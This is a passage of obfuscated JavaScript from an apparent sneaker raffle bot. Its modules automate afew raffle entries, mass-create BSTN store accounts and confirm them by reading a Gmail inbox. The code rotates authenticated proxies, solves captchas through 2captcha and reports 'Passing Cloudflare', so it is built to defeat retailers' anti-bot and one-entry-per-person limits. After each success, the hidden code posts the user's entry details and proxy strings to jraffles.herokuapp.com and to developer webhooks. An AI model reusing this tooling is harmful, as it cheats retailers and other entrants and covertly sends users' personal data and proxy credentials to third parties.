                        _0x310fc5 = await _0x3d8cc4['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x48edf0[0x0] + ':' + _0x48edf0[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        var _0x14fae7 = JSON['parse'](_0xa4bb3a['readFileSync']('sizes.json', 'utf-8')), _0x2042ef = _0xa8f24d[_0x839c94]['Url'], _0x2dbf77 = _0xa8f24d[_0x839c94]['Size'], _0x55f9f0;
                        async function _0x5049fb() {
                            var _0x3ba6e8 = new _0x4c0c76['CookieJar']();
                            console['log'](_0x451967() + '\x20[' + _0x306ca2['name'] + ']\x20Task\x20' + (_0x839c94 + 0x1) + '\x20:\x20Getting\x20Session');
                            var _0x29cdd9;
                            let _0x18382f = {
                                'method': 'GET',
                                'cookieJar': _0x3ba6e8,
                                'headers': {
                                    'Connection': 'keep-alive',
                                    'Pragma': 'no-cache',
                                    'Cache-Control': 'no-cache',
                                    'sec-ch-ua': '\x22Google\x20Chrome\x22;v=\x2289\x22,\x20\x22Chromium\x22;v=\x2289\x22,\x20\x22;Not\x20A\x20Brand\x22;v=\x2299\x22',
                                    'sec-ch-ua-mobile': '?0',
                                    'DNT': '1',
                                    'Upgrade-Insecure-Requests': '1',
                                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                                    'cookies': '',
                                    'Sec-Fetch-Site': 'none',
                                    'Sec-Fetch-Mode': 'navigate',
                                    'Sec-Fetch-User': '?1',
                                    'Sec-Fetch-Dest': 'document',
                                    'Accept-Language': 'en-US,en;q=0.9'
                                },
                                'proxy': 'http://' + _0x48edf0[0x2] + ':' + _0x48edf0[0x3] + '@' + _0x48edf0[0x0] + ':' + _0x48edf0[0x1]
                            }, _0x42d7f1 = _0x2042ef['replace']('de.afew-store.com', 'en.afew-store.com')['replace']('en.afew-store.com', 'raffles.afew-store.com'), _0x574bc3 = _0x42d7f1 + '.json', _0x21511c = await _0x2c480f(_0x574bc3);
                            console['log'](_0x451967() + '\x20[' + _0x306ca2['name'] + ']\x20Task\x20' + (_0x839c94 + 0x1) + '\x20:\x20Getting\x20Variants');
                            let _0x3011b2 = _0x21511c['data']['product']['variants'];
                            if (_0x2dbf77 != 'RANDOM') {
                                if (_0x3011b2[0x1]['option1']['includes']('W')) {
                                    const _0x2fb97b = _0x14fae7['women']['find'](_0x18f96b => _0x18f96b['EUsize'] === _0x2dbf77);
                                    _0x2fb97b && (_0x2dbf77 = _0x2fb97b['size']);
                                } else {
                                    if (_0x3011b2[0x1]['option1']['includes']('Y')) {
                                        const _0x75dd04 = _0x14fae7['GS']['find'](_0xf01b82 => _0xf01b82['EUsize'] === _0x2dbf77);
                                        _0x75dd04 && (_0x2dbf77 = _0x75dd04['size']);
                                    } else {
                                        const _0x3208a4 = _0x14fae7['men']['find'](_0x411e1b => _0x411e1b['EUsize'] === _0x2dbf77);
                                        _0x3208a4 && (_0x2dbf77 = _0x3208a4['size']);
                                    }
                                }
                                for (var _0xc6b296 of _0x3011b2) {
                                    _0xc6b296['option1'] == _0x2dbf77 && (_0x29cdd9 = _0xc6b296['id']);
                                }
                            } else {
                                var _0x45ad67 = Math['round'](Math['random']() * (_0x3011b2['length'] - 0x1));
                                _0x29cdd9 = _0x3011b2[_0x45ad67]['id'];
                            }
                            console['log'](_0x451967() + '\x20[' + _0x306ca2['name'] + ']\x20Task\x20' + (_0x839c94 + 0x1) + '\x20:\x20Adding\x20to\x20Cart'), addToCart = await _0x2c480f('https://raffles.afew-store.com/cart/' + _0x29cdd9 + ':1'), _0x55f9f0 = addToCart['request']['res']['responseUrl'];
                        }
                        try {
                            await _0x5049fb();
                        } catch (_0x25766e) {
                            if (_0x25766e['message']['includes']('TUNN'))
                                throw new Error('Proxy\x20Connection\x20Error');
                            throw new Error('Proxy\x20Error:\x20' + _0x25766e);
                        }
                        const _0x21d2b5 = await _0x310fc5['newPage']();
                        await _0x21d2b5['setDefaultNavigationTimeout'](0x1d4c0), await _0x21d2b5['authenticate']({
                            'username': '' + _0x48edf0[0x2],
                            'password': '' + _0x48edf0[0x3]
                        }), await _0x21d2b5['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x21d2b5['setRequestInterception'](!![]), _0x21d2b5['on']('request', _0x2df7d2 => {
                            _0x2df7d2['resourceType']() === 'image' || _0x2df7d2['resourceType']() === 'font' || _0x2df7d2['resourceType']() === 'media' ? _0x2df7d2['abort']() : _0x2df7d2['continue']();
                        });
                        try {
                            await _0x21d2b5['goto'](_0x55f9f0, { 'waituntil': 'networkidle0' });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        console['log'](_0x451967() + '\x20[' + _0x306ca2['name'] + ']\x20Task\x20' + (_0x839c94 + 0x1) + '\x20:\x20Submitting\x20Information');
                        try {
                            await _0x21d2b5['waitForSelector']('#checkout_email');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x21d2b5['type']('#checkout_email', '' + _0xa8f24d[_0x839c94]['Email']), await _0x2be9fc(0x320), await _0x21d2b5['type']('#checkout_attributes_instagram', '' + _0xa8f24d[_0x839c94]['Follower']), await _0x2be9fc(0x320), await _0x21d2b5['select']('#checkout_shipping_address_country', '' + _0xa8f24d[_0x839c94]['Country']), await _0x21d2b5['waitForTimeout'](0x258), await _0x21d2b5['type']('#checkout_shipping_address_first_name', '' + _0xa8f24d[_0x839c94]['FirstName']), await _0x21d2b5['waitForTimeout'](0x320), await _0x21d2b5['type']('#checkout_shipping_address_last_name', '' + _0xa8f24d[_0x839c94]['LastName']), await _0x21d2b5['waitForTimeout'](0x2bc), await _0x21d2b5['type']('#checkout_shipping_address_address1', _0xa8f24d[_0x839c94]['Address1'] + '\x20' + _0xa8f24d[_0x839c94]['HouseNumber']), await _0x21d2b5['waitForTimeout'](0x2bc), await _0x21d2b5['type']('#checkout_shipping_address_address2', '' + _0xa8f24d[_0x839c94]['Address2']), await _0x21d2b5['waitForTimeout'](0x2bc), await _0x21d2b5['type']('#checkout_shipping_address_zip', '' + _0xa8f24d[_0x839c94]['Zip']), await _0x21d2b5['waitForTimeout'](0x2bc), await _0x21d2b5['type']('#checkout_shipping_address_city', '' + _0xa8f24d[_0x839c94]['City']), await _0x21d2b5['waitForTimeout'](0x2bc);
                        if (_0xa8f24d[_0x839c94]['State'] != '')
                            try {
                                const _0xb5b4be = JSON['parse'](_0xa4bb3a['readFileSync']('States.json', 'utf8'));
                                await _0x2be9fc(0x1f4);
                                if (_0xa8f24d[_0x839c94]['State']['length'] > 0x2)
                                    for (let _0x436028 of _0xb5b4be) {
                                        if (_0x436028['Province'] == _0xa8f24d[_0x839c94]['State']) {
                                            await _0x21d2b5['select']('#checkout_shipping_address_province', _0x436028['Code']);
                                            break;
                                        }
                                    }
                                else
                                    await _0x21d2b5['select']('#checkout_shipping_address_province', _0xa8f24d[_0x839c94]['State']['toUpperCase']());
                            } catch {
                            }
                        await _0x2be9fc(0x1f4), console['log'](_0x451967() + '\x20[' + _0x306ca2['name'] + ']\x20Task\x20' + (_0x839c94 + 0x1) + '\x20:\x20Getting\x20Shipping'), await _0x2be9fc(0x190), _0x21d2b5['evaluate'](() => {
                            const _0xc3e7c1 = document['querySelector']('#continue_button');
                            for (var _0x272936 = 0x0; _0x272936 < 0x5; _0x272936++) {
                                if (_0xc3e7c1) {
                                    _0xc3e7c1['click'](), _0xc3e7c1['click']();
                                    break;
                                } else
                                    _0x2be9fc(0xfa0);
                            }
                        }), await _0x21d2b5['waitForTimeout'](0x9c4);
                        try {
                            await _0x21d2b5['waitForSelector']('form[data-shipping-method-form=\x22true\x22]'), await _0x21d2b5['$eval']('form[data-shipping-method-form=\x22true\x22]', _0x1f09ab => _0x1f09ab['submit']());
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x21d2b5['waitForTimeout'](0x7d0), console['log'](_0x451967() + '\x20[' + _0x306ca2['name'] + ']\x20Task\x20' + (_0x839c94 + 0x1) + '\x20:\x20Finishing\x20Entry');
                        try {
                            await _0x21d2b5['waitForSelector']('div[data-payment-subform=\x22required\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x2be9fc(0x3e8), await _0x21d2b5['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20div\x20>\x20form', _0x1b03a3 => _0x1b03a3['submit']()), await _0x2be9fc(0x3e8);
                        try {
                            await _0x21d2b5['waitForSelector']('div[data-last-step=\x22true\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x21d2b5['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20form', _0x1fc16d => _0x1fc16d['submit']());
                        try {
                            await _0x21d2b5['waitForSelector']('div[data-step=\x22thank_you\x22]'), _0xb0c027 = 'no', _0x34c52d(_0xa8f24d[_0x839c94], _0x306ca2), console['log'](_0x10a2e3['green'](_0x451967() + '\x20[' + _0x306ca2['name'] + ']\x20Task\x20' + (_0x839c94 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            if (_0x30cea3['webhook'] != undefined && _0x30cea3['webhook'] != '')
                                try {
                                    await _0x1bfffd(_0x30cea3['webhook'], _0x4880b4['succesDEVMSG']);
                                } catch {
                                }
                            await _0x2be9fc(0xc8), await _0x1bfffd(_0x301a88, _0x4880b4['succesDEVMSG']), await _0x2be9fc(0xc8);
                            try {
                                await _0x1bfffd(_0x3b111f, _0x4880b4['succesPUBMSG']);
                            } catch {
                            }
                            try {
                                prxdata = {
                                    'username': _0x3373db['replace']('#', ''),
                                    'module': _0x306ca2['name'],
                                    'entrydata': JSON['stringify'](_0x1d06a9),
                                    'proxy': '' + _0x1603b9[_0x839c94]
                                };
                                var _0x13514f = JSON['stringify'](prxdata);
                                let _0x3ea86f = { 'headers': { 'content-type': 'application/json' } };
                                await _0x2c480f['post']('https://jraffles.herokuapp.com/success', _0x13514f, _0x3ea86f);
                            } catch (_0x408377) {
                            }
                        } catch (_0xb378ba) {
                            throw new Error('Connection\x20Error\x20Fetching\x20Response');
                        }
                    } catch (_0x3de65a) {
                        _0x3de65a['message']['includes']('selector') && (_0x3de65a = 'Connection\x20Error');
                        console['log'](_0x10a2e3['red'](_0x451967() + '\x20[' + _0x306ca2['name'] + ']\x20Task\x20' + (_0x839c94 + 0x1) + '\x20:\x20' + _0x3de65a)), _0x325be2 = '' + _0x3de65a;
                        var _0x1a9d78 = await _0x14203e(_0xa8f24d[_0x839c94], _0x306ca2, 'dev', !![], _0x325be2);
                        _0x4880b4['errorDEV'] = { 'embeds': [_0x1a9d78] }, _0x30cea3['webhook'] != undefined && _0x30cea3['webhook'] != '' && await _0x1bfffd(_0x30cea3['webhook'], _0x4880b4['errorDEV']), await _0x1bfffd(_0x31e47f, _0x4880b4['errorDEV']), _0xb0c027 = 'yes';
                    } finally {
                        _0x310fc5 && _0x310fc5['close']();
                        if (_0xb0c027 == 'yes' && _0x3d8bb6 != 0x5 && _0x325be2 != 'Size\x20Not\x20Found') {
                            console['log'](_0x10a2e3['red'](_0x451967() + '\x20[' + _0x306ca2['name'] + ']\x20Task\x20' + (_0x839c94 + 0x1) + '\x20:\x20Retrying\x20(' + _0x3d8bb6 + '\x20/\x205)')), _0x839c94 = _0x839c94 - 0x1, _0x3d8bb6 = _0x3d8bb6 + 0x1;
                            continue;
                        }
                        _0xb0c027 == 'yes' && _0x3d8bb6 >= 0x5 && (_0x48f0c7(_0xa8f24d[_0x839c94], _0x306ca2), _0xb0c027 = 'no', _0x3d8bb6 = 0x0);
                        if (_0x839c94 + 0x1 == _0xa8f24d['length']) {
                            await _0x2be9fc(0x7d0);
                            break;
                        }
                        console['log']('Waiting\x20for\x20' + _0x30cea3['AfewDelay'] + '\x20ms'), await _0x2be9fc(_0x30cea3['AfewDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'BSTN',
        'modules': [
            {
                'name': 'BSTN\x20Account\x20Generator',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x2c72d4, _0x1649fb, _0x26e8ee) {
                    var _0x4fd4aa = _0x1649fb, _0x45fd1d = 0x0;
                    for (var _0x4dca0a = 0x0; _0x4dca0a < _0x1649fb['length']; _0x4dca0a++) {
                        maxTasks = Number(_0x30cea3['threads']);
                        while (_0x45fd1d >= maxTasks) {
                            await _0x2be9fc(_0x30cea3['delay']);
                        }
                        async function _0x4b5123(_0x233851, _0x5f3f7b, _0x1f49bf, _0x2b6852, _0x3ba50b) {
                            _0x45fd1d++, _0x3d8cc4['use'](_0x29d882()), _0x3d8cc4['use'](_0x173890({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x30cea3['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            var _0x4dba99;
                            try {
                                await _0x319293(_0x5f3f7b, _0x2b6852);
                            } catch {
                                retry = 'no';
                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                            }
                            _0x1a7b1b(_0x233851['name'] + '\x20Task\x20' + (_0x2b6852 + 0x1) + '\x20/\x20' + _0x5f3f7b['length'] + '\x20||\x20File:\x20' + _0x733fd9 + '\x20Proxies:\x20' + _0x253bf1);
                            var _0x1185b3 = await _0x14203e(_0x5f3f7b[_0x2b6852], _0x233851, 'acc', ![]);
                            const _0x335476 = { 'succesDEVMSG': { 'embeds': [_0x1185b3] } }, _0x420102 = 'https://www.bstn.com/eu_en/customer/account/create/';
                            var _0x233f6c = Math['round'](Math['random']() * (_0x1f49bf['length'] - 0x1)), _0xe99901 = _0x1f49bf[_0x233f6c]['split'](':'), _0x6a1d32;
                            try {
                                _0x6a1d32 = await _0x3d8cc4['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0xe99901[0x0] + ':' + _0xe99901[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x6a1d32 = await _0x3d8cc4['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0xe99901[0x0] + ':' + _0xe99901[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                const _0x279472 = await _0x6a1d32['newPage']();
                                await _0x279472['authenticate']({
                                    'username': '' + _0xe99901[0x2],
                                    'password': '' + _0xe99901[0x3]
                                }), console['log'](_0x451967() + '\x20[' + _0x233851['name'] + ']\x20Task\x20' + (_0x2b6852 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x279472['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x279472['setRequestInterception'](!![]), _0x279472['on']('request', _0x29db13 => {
                                    _0x29db13['resourceType']() === 'image' ? _0x29db13['abort']() : _0x29db13['continue']();
                                });
                                try {
                                    await _0x279472['goto']('' + _0x420102), await _0x279472['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                                } catch {
                                    retry = 'yes';
                                    throw new Error('Proxy\x20Error');
                                }
                                await _0x279472['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x451967() + '\x20[' + _0x233851['name'] + ']\x20Task\x20' + (_0x2b6852 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x2be9fc(0x7d0), console['log'](_0x451967() + '\x20[' + _0x233851['name'] + ']\x20Task\x20' + (_0x2b6852 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x2be9fc(0x190), await _0x279472['waitForSelector']('#firstname'), await _0x279472['type']('#firstname', _0x5f3f7b[_0x2b6852]['FirstName'], { 'delay': 0xf0 }), await _0x2be9fc(0x190), await _0x279472['type']('#lastname', _0x5f3f7b[_0x2b6852]['LastName'], { 'delay': 0xe6 }), await _0x2be9fc(0x190), await _0x279472['type']('#email_address', _0x5f3f7b[_0x2b6852]['Email'], { 'delay': 0x122 }), await _0x2be9fc(0x190), await _0x279472['type']('#password', _0x5f3f7b[_0x2b6852]['Password'], { 'delay': 0x82 }), await _0x2be9fc(0x1f4), await _0x279472['type']('#password-confirmation', _0x5f3f7b[_0x2b6852]['Password'], { 'delay': 0x7c }), console['log'](_0x451967() + '\x20[' + _0x233851['name'] + ']\x20Task\x20' + (_0x2b6852 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x2be9fc(0x2bc), await _0x279472['$eval']('#form-validate', _0x5e2e8b => _0x5e2e8b['submit']()), await _0x2be9fc(0x1388);
                                const _0x24c19e = await _0x279472['$']('#email_address-error');
                                if (_0x24c19e)
                                    throw new Error('Invalid\x20Email');
                                const _0x3da903 = await _0x279472['$']('#password-error');
                                if (_0x3da903)
                                    throw new Error('Invalid\x20Password');
                                await _0x279472['waitForSelector']('div.mesg-success'), retry = 'no', console['log'](_0x10a2e3['green'](_0x451967() + '\x20[' + _0x233851['name'] + ']\x20Task\x20' + (_0x2b6852 + 0x1) + '\x20:\x20Account\x20' + _0x5f3f7b[_0x2b6852]['Email'] + '\x20Generated')), _0xa4bb3a['appendFileSync']('../accounts/bstn.csv', '\x0a' + _0x5f3f7b[_0x2b6852]['Email'] + ',' + _0x5f3f7b[_0x2b6852]['Password']);
                                try {
                                    _0x30cea3['webhook'] != undefined && _0x30cea3['webhook'] != '' && await _0x1bfffd(_0x30cea3['webhook'], _0x335476['succesDEVMSG']);
                                } catch {
                                }
                                await _0x1bfffd(_0x3708dd, _0x335476['succesDEVMSG']);
                                let _0x40962f = _0x5f3f7b[_0x2b6852];
                                try {
                                    prxdata = {
                                        'username': _0x3373db['replace']('#', ''),
                                        'module': _0x233851['name'],
                                        'entrydata': JSON['stringify'](_0x40962f),
                                        'proxy': '' + _0x1f49bf[_0x2b6852]
                                    };
                                    var _0x4cf7e4 = JSON['stringify'](prxdata);
                                    let _0x5ef01 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x2c480f['post']('https://jraffles.herokuapp.com/success', _0x4cf7e4, _0x5ef01);
                                } catch (_0x487966) {
                                }
                                console['log'](_0x10a2e3['yellow'](_0x451967() + '\x20[' + _0x233851['name'] + ']\x20Task\x20' + (_0x2b6852 + 0x1) + '\x20:\x20After\x20your\x20all\x20tasks\x20are\x20finished,\x20run\x20\x27BSTN\x20Account\x20Verifier\x27'));
                            } catch (_0x44532d) {
                                console['log'](_0x10a2e3['red'](_0x451967() + '\x20[' + _0x233851['name'] + ']\x20Task\x20' + (_0x2b6852 + 0x1) + '\x20:\x20' + _0x44532d)), _0x4dba99 = '' + _0x44532d;
                                var _0x4c71aa = await _0x14203e(_0x5f3f7b[_0x2b6852], _0x233851, 'acc', !![], _0x4dba99);
                                _0x335476['errorDEV'] = { 'embeds': [_0x4c71aa] }, _0x30cea3['webhook'] != undefined && _0x30cea3['webhook'] != '' && await _0x1bfffd(_0x30cea3['webhook'], _0x335476['errorDEV']), await _0x1bfffd(_0x31e47f, _0x335476['errorDEV']), retry = 'yes';
                            } finally {
                                if (_0x6a1d32)
                                    _0x6a1d32['close']();
                                if (retry == 'yes' && _0x3ba50b != 0x5)
                                    return console['log'](_0x10a2e3['red'](_0x451967() + '\x20[' + _0x233851['name'] + ']\x20Task\x20' + (_0x2b6852 + 0x1) + '\x20:\x20Retrying\x20(' + (_0x3ba50b + 0x1) + '\x20/\x205)')), _0x45fd1d--, _0x3ba50b = _0x3ba50b + 0x1, _0x4b5123(_0x233851, _0x5f3f7b, _0x1f49bf, _0x2b6852, _0x3ba50b);
                                retry == 'yes' && _0x3ba50b >= 0x5 && (_0x48f0c7(_0x5f3f7b[_0x2b6852], _0x233851), retry = 'no', _0x3ba50b = 0x0), _0x45fd1d--, console['log'](_0x451967() + '\x20[' + _0x233851['name'] + ']\x20Waiting\x20for\x20' + _0x30cea3['delay'] + '\x20ms'), await _0x2be9fc(_0x30cea3['delay']);
                            }
                        }
                        _0x4b5123(_0x2c72d4, _0x4fd4aa, _0x26e8ee, _0x4dca0a, 0x0), await _0x2be9fc(0x190);
                    }
                }
            },
            {
                'name': 'BSTN\x20Account\x20Verifier',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x37eedb, _0x5df4f9) {
                    var _0xffaf84 = ![], _0x21161e = [];
                    async function _0x20e0fd() {
                        var _0x282ff2 = new _0x2e8fd8({
                            'user': _0x30cea3['masterMail'],
                            'password': _0x30cea3['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x22548e(_0x13d9c4) {
                            _0x282ff2['openBox']('INBOX', ![], _0x13d9c4);
                        }
                        _0x282ff2['once']('ready', function () {
                            _0x22548e(function (_0x51a536, _0xbd0d9b) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x51a536)
                                    throw _0x51a536;
                                _0x282ff2['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Please\x20confirm\x20your\x20BSTN\x20Store\x20account'
                                    ]
                                ], function (_0x49c80f, _0x41ee7b) {
                                    if (!_0x41ee7b || !_0x41ee7b['length'])
                                        console['log'](_0x451967() + '\x20[' + _0x37eedb['name'] + ']\x20No\x20mails\x20found'), _0x282ff2['end']();
                                    else {
                                        var _0x20ac04 = _0x282ff2['seq']['fetch'](_0x41ee7b, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x20ac04['on']('message', function (_0x7d3f4, _0x22927f) {
                                            var _0x2ee220 = '(#' + _0x22927f + ')\x20';
                                            _0x7d3f4['on']('body', function (_0x573c3c, _0x88e657) {
                                                _0x2f2a1d(_0x573c3c, (_0x408ce6, _0x3d7a8a) => {
                                                    var _0x29acac = _0x3d7a8a['text']['split']('customer/account/confirm/')[0x1], _0x156847 = _0x29acac['split'](']')[0x0];
                                                    _0x21161e['push']('https://www.bstn.com/eu_en/customer/account/confirm/' + _0x156847);
                                                });
                                            }), _0x7d3f4['once']('end', function () {
                                            });
                                        }), _0x20ac04['once']('error', function (_0x31b47a) {
                                            console['log']('Fetch\x20error:\x20' + _0x31b47a), _0xffaf84 = !![];
                                        }), _0x20ac04['once']('end', function () {
                                            _0x282ff2['end'](), _0xffaf84 = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x282ff2['once']('error', function (_0x291531) {
                            console['log'](_0x10a2e3['red'](_0x291531['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0xffaf84 = !![];
                        }), _0x282ff2['once']('end', async function () {
                            _0xffaf84 = !![];
                        }), _0x282ff2['connect']();
                    }
                    async function _0x186bd6(_0x40baaf, _0x5322e1, _0x351a26) {
                        _0x3d8cc4['use'](_0x29d882());
                        for (var _0xec38f1 = 0x0; _0xec38f1 < _0x5322e1['length']; _0xec38f1++) {
                            if (_0x43648a != 'yes')
                                var _0x43648a = '', _0x5c336b = 0x0;
                            var _0x4e484b = Math['round'](Math['random']() * (_0x351a26['length'] - 0x1)), _0x428966 = _0x351a26[_0x4e484b]['split'](':'), _0x5dae83;
                            try {
                                _0x5dae83 = await _0x3d8cc4['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x428966[0x0] + ':' + _0x428966[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x5dae83 = await _0x3d8cc4['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x428966[0x0] + ':' + _0x428966[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                const _0x2e1c57 = await _0x5dae83['newPage']();
                                await _0x2e1c57['authenticate']({
                                    'username': '' + _0x428966[0x2],
                                    'password': '' + _0x428966[0x3]
                                }), console['log'](_0x451967() + '\x20[' + _0x40baaf['name'] + ']\x20Task\x20' + (_0xec38f1 + 0x1) + '\x20:\x20Starting\x20Verification'), await _0x2e1c57['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x2e1c57['setRequestInterception'](!![]), _0x2e1c57['on']('request', _0x2dbc30 => {
                                    _0x2dbc30['resourceType']() === 'image' || _0x2dbc30['resourceType']() === 'font' || _0x2dbc30['resourceType']() === 'media' ? _0x2dbc30['abort']() : _0x2dbc30['continue']();
                                }), console['log'](_0x451967() + '\x20[' + _0x40baaf['name'] + ']\x20Task\x20' + (_0xec38f1 + 0x1) + '\x20:\x20Getting\x20Session');
                                try {
                                    await _0x2e1c57['goto'](_0x5322e1[_0xec38f1]);
                                } catch (_0x32767c) {
                                    _0x43648a = 'yes';
                                    throw new Error('\x27Connection\x20Error\x27\x20' + _0x32767c);
                                }
                                console['log'](_0x451967() + '\x20[' + _0x40baaf['name'] + ']\x20Task\x20' + (_0xec38f1 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x2e1c57['waitForTimeout'](0xbb8);
                                try {
                                    await _0x2e1c57['waitForSelector']('.account-nav'), _0x43648a = 'no', console['log'](_0x10a2e3['green'](_0x451967() + '\x20[' + _0x40baaf['name'] + ']\x20Task\x20' + (_0xec38f1 + 0x1) + '\x20:\x20Verification\x20Successful'));
                                    var _0x21b5c7 = await _0x14203e(null, _0x40baaf, 'ver', ![]);
                                    const _0x36c9ff = { 'succesDEVMSG': { 'embeds': [_0x21b5c7] } };
                                    await _0x1bfffd(_0x14b3d3, _0x36c9ff['succesDEVMSG']);
                                } catch {
                                    _0x43648a = 'no';
                                    throw new Error('Link\x20Already\x20Verified,\x20skipping..');
                                }
                            } catch (_0x129fdc) {
                                console['log'](_0x10a2e3['red'](_0x451967() + '\x20[' + _0x40baaf['name'] + ']\x20Task\x20' + (_0xec38f1 + 0x1) + '\x20:\x20' + _0x129fdc));
                                var _0x1d2a92 = _0x129fdc, _0x5d5dcd = await _0x14203e(null, _0x40baaf, 'ver', !![], _0x1d2a92);
                                const _0x5615fc = { 'errorDEVMSG': { 'embeds': [_0x5d5dcd] } };
                                _0x30cea3['webhook'] != undefined && _0x30cea3['webhook'] != '' && await _0x1bfffd(_0x30cea3['webhook'], _0x5615fc['errorDEVMSG']), await _0x1bfffd(_0x31e47f, _0x5615fc['errorDEVMSG']);
                            } finally {
                                _0x5dae83['close']();
                                if (_0x43648a == 'yes' && _0x5c336b != 0x5) {
                                    console['log'](_0x10a2e3['red'](_0x451967() + '\x20[' + _0x40baaf['name'] + ']\x20Task\x20' + (_0xec38f1 + 0x1) + '\x20:\x20Retrying\x20(' + _0x5c336b + '\x20/\x205)')), _0xec38f1 = _0xec38f1 - 0x1, _0x5c336b = _0x5c336b + 0x1;
                                    continue;
                                }
                                _0x43648a == 'yes' && _0x5c336b >= 0x5 && (_0x43648a = 'no', _0x5c336b = 0x0), console['log'](_0x451967() + '\x20[' + _0x40baaf['name'] + ']\x20Waiting\x20for\x20' + _0x30cea3['delay'] + '\x20ms'), await _0x2be9fc(_0x30cea3['delay']);
                            }
                        }
                    }
                    try {
                        _0x20e0fd();
                        while (!_0xffaf84) {
                            await _0x2be9fc(0xfa0);
                        }
                        console['log']('Found\x20' + _0x21161e['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x2be9fc(0x7d0);
                    }
                    await _0x186bd6(_0x37eedb, _0x21161e, _0x5df4f9);
                }
            },
            {
                'name': 'BSTN\x20Raffle\x20Entries',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x52910b, _0x1a90ed, _0x2b31cc) {
                    var _0x7cc99b = 0x0, _0x1d2d0d = _0x1a90ed;
                    for (var _0x2d6cd5 = 0x0; _0x2d6cd5 < _0x1a90ed['length']; _0x2d6cd5++) {
                        maxTasks = Number(_0x30cea3['threads']);
                        while (_0x7cc99b >= maxTasks) {
                            await _0x2be9fc(_0x30cea3['delay']);
                        }
                        let _0x325ab5 = ![];
                        async function _0x781fbc(_0x242a5c, _0x37e9c3, _0x4bca40, _0x3cdc34, _0x4b16ae) {
